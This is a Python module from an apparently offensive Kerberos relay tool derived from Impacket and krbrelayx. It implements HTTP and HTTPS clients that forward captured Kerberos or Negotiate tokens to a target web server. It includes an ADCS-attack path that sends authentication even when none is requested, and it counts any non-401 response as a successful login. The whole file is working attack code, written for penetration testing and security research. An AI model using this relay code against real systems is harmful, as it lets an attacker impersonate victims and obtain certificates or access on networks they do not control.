# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   HTTP Protocol Client
#   HTTP(s) client for relaying NTLMSSP authentication to webservers
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Alberto Solino (@agsolino)
#
# Fitted for remoteKrbRelayx by Ole Fredrik Borgundvåg Berg (@olefredrikberg) / Helse- og KommuneCERT
#

import ssl
try:
    from http.client import HTTPConnection, HTTPSConnection
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection
import base64

from impacket import LOG
from remotekrbrelayx.krbrelayx.lib.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED

PROTOCOL_CLIENT_CLASSES = ["HTTPRelayClient","HTTPSRelayClient"]

class HTTPRelayClient(ProtocolClient):
    PLUGIN_NAME = "HTTP"

    def __init__(self, serverConfig, target, targetPort = 80, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.authenticationMethod = None

    def initConnection(self, authdata):
        self.session = HTTPConnection(self.targetHost,self.targetPort) if self.session is None else self.session
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        return self.doInitialActions(authdata)

    def doInitialActions(self, authdata):
        self.session.request('GET', self.path)
        res = self.session.getresponse()
        res.read()
        if res.status != 401:
            LOG.info('Status code returned: %d. Authentication does not seem required for URL' % res.status)
        try:
            if 'Kerberos' not in res.getheader('WWW-Authenticate') and 'Negotiate' not in res.getheader('WWW-Authenticate'):
                LOG.error('Kerberos Auth not offered by URL, offered protocols: %s' % res.getheader('WWW-Authenticate'))
                return False
            if 'Kerberos' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = "Kerberos"
            elif 'Negotiate' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = "Negotiate"
        except (KeyError, TypeError):
            LOG.error('No authentication requested by the server for url %s' % self.targetHost)
            if self.serverConfig.isADCSAttack:
                LOG.info('IIS cert server may allow anonymous authentication, sending NTLM auth anyways')
            else:
                return False

        return self.sendNegotiate(authdata)

    def sendNegotiate(self, authdata):
        headers = {'Authorization':'%s %s' % (self.authenticationMethod, base64.b64encode(authdata['krbauth']).decode("ascii"))}
        self.session.request('GET', self.path, headers=headers)
        res = self.session.getresponse()
        res.read()
        if res.status == 401 and res.getheader('WWW-Authenticate') is not None:
            if 'Negotiate' not in res.getheader('WWW-Authenticate'):
                return True, STATUS_ACCESS_DENIED
            negotiate = base64.b64decode(res.getheader('WWW-Authenticate').split(' ')[1])
            return False, negotiate
        if res.status == 401:
            return True, STATUS_ACCESS_DENIED
        else:
            LOG.info('HTTP server returned status code %d, treating as a successful login' % res.status)
            self.lastresult = res.read()
            return True, STATUS_SUCCESS

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def keepAlive(self):
        # Do a HEAD for favicon.ico
        self.session.request('HEAD','/favicon.ico')
        self.session.getresponse()

class HTTPSRelayClient(HTTPRelayClient):
    PLUGIN_NAME = "HTTPS"

    def __init__(self, serverConfig, target, targetPort = 443, extendedSecurity=True ):
        HTTPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self, authdata):
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost,self.targetPort, context=uv_context) if self.session is None else self.session
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost,self.targetPort) if self.session is None else self.session
        return self.doInitialActions(authdata)

